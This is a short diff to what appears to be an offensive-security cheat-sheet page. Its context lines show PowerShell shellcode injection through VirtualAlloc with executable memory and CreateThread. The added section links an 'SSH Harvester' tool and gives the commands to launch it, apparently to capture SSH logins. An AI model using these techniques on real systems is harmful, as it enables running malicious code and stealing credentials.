@@ -1249,5 +1249,21 @@ $mem = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x1000, 0x40)
 $thread = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)
 ```
 
+ ## SSH Harvester
+    
+ ```
+ https://github.com/jm33-m0/SSH-Harvester
+    
+ sudo ./start_sshd.sh
+
+# in another terminal
+./inject.sh
+
+# then
+ssh -p2222 user@localhost
+
+# check what happens   
+ ```
+  
 
 {% include links.html %}
